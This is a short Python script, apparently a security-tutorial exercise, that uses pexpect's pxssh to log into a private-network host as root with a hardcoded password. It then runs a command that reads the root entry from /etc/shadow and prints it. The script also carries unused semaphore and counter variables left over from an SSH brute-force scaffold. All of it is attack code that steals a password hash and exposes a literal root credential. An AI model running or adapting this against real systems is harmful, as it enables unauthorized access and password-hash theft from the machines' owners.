#!/usr/bin/python3

from pexpect import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)
def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    except:
        print('[-] Error Connecting')
        exit(0)
s = connect('192.168.28.174', 'root', '75356072')
send_command(s, 'cat /etc/shadow | grep root')


